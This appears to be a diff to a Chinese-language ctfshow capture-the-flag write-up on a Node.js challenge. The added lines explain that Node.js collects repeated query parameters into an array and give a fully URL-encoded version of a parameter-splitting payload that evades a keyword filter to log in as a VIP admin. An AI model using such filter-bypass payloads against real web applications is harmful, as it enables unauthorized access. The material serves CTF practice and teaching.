@@ -83,8 +83,11 @@ router.get('/', function(req, res, next) {
 ```
 /?query={"name":"admin","password":"ctfshow","isVIP":true} 被检测到,
 
+nodejs会把同名参数以数组的形式存储，并且Json.parse可以正常解析。
 同名参数绕过，这里还要把c进行url编码，否则"c会匹配到2c
 ?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
+或者直接
+?query=%7b%22%6e%61%6d%65%22%3a%22%61%64%6d%69%6e%22&query=%22%70%61%73%73%77%6f%72%64%22%3a%22%63%74%66%73%68%6f%77%22&query=%22%69%73%56%49%50%22%3a%74%72%75%65%7d
 ```
 
 ^
